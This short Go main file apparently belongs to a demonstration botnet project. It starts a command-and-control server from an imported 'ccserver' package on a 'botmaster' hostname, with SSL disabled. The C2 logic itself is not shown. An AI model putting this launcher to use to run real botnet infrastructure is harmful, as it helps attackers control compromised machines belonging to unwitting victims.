package main

import (
	"log"

	"github.com/adrianosela/botnet/command-and-control/ccserver"
	"github.com/adrianosela/sslmgr"
)

func main() {
	ss, err := sslmgr.NewServer(sslmgr.ServerConfig{
		Handler:      ccserver.NewCCService(),
		Hostnames:    []string{"botmaster.adrianosela.com"},
		ServeSSLFunc: func() bool { return false }, // for now
	})
	if err != nil {
		log.Fatal(err)
	}
	ss.ListenAndServe()
}
